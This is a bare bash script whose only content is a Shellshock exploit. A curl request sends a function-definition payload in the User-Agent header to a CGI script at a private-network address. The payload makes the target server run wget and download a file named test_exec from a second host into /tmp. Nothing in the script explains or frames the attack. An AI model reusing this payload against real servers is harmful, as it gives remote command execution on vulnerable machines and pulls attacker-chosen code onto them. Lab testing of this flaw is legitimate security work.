#!/bin/bash
curl -k -H 'User-Agent: () { :;}; /bin/bash -c "echo \"Content-type: text/html\r\n\r\n\"; echo \"\"; /usr/bin/wget -t 1 http://192.168.55.215/test_exec -O /tmp/test_exec;"' 192.168.55.216/cgi-bin/ss.cgi
